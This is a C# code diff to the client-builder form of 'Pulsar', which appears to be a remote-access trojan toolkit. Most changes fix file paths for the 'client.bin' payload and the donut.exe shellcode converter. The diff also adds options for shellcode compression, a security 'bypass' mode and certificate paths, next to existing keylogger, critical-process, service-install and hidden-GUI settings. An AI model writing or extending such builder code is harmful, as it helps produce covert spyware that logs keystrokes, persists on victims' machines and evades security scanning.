@@ -2,6 +2,7 @@ using Pulsar.Common.DNS;
 using Pulsar.Common.Helpers;
 using Pulsar.Server.Build;
 using Pulsar.Server.Forms.DarkMode;
+using Pulsar.Server.Helper;
 using Pulsar.Server.Models;
 using Pulsar.Server.Utilities;
 using System;
@@ -369,8 +370,9 @@ namespace Pulsar.Server.Forms
             UpdateKeyloggerControlStates();
             UpdatePastebinUI();
 
-            btnShellcode.Enabled = File.Exists(Path.Combine(Environment.CurrentDirectory, "donut.exe"));
-            groupBox1.Visible = File.Exists(Path.Combine(Environment.CurrentDirectory, "donut.exe"));
+            string donutPath = Path.Combine(AppContext.BaseDirectory, "donut.exe");
+            btnShellcode.Enabled = File.Exists(donutPath);
+            groupBox1.Visible = File.Exists(donutPath);
 
             comboBox1.SelectedIndex = 0;
         }
@@ -594,8 +596,12 @@ namespace Pulsar.Server.Forms
             options.CRITICALPROCESS = chkCriticalProcess.Checked;
             options.INSTALLSERVICE = chkInstallService.Checked;
             options.SHOWCLIENTGUI = chkShowGui.Checked;
+            options.CertificatePath = Settings.CertificatePath;
+            options.DonutPath = Path.Combine(AppContext.BaseDirectory, "donut.exe");
+            options.ShellcodeCompression = ShellcodeBuilder.ConvertCompressionTextToEnum(comboBox1.Text);
+            options.ShellcodeBypass = checkBox2.Checked ? Bypass.Continue : Bypass.None;
 
-            if (!File.Exists("client.bin"))
+            if (!File.Exists(Path.Combine(AppContext.BaseDirectory, "client.bin")))
             {
                 throw new Exception("Could not locate \"client.bin\" file. It should be in the same directory as Pulsar.");
             }
@@ -713,7 +719,7 @@ namespace Pulsar.Server.Forms
             {
                 BuildOptions options = (BuildOptions)o;
 
-                var builder = new ClientBuilder(options, "client.bin");
+                var builder = new ClientBuilder(options, Path.Combine(AppContext.BaseDirectory, "client.bin"));
 
                 var code = builder.Build(false, false);
 
@@ -758,7 +764,7 @@ namespace Pulsar.Server.Forms
             {
                 BuildOptions options = (BuildOptions)o;
 
-                var builder = new ClientBuilder(options, "client.bin");
+                var builder = new ClientBuilder(options, Path.Combine(AppContext.BaseDirectory, "client.bin"));
 
                 builder.BuildShellcode(false, false);
 
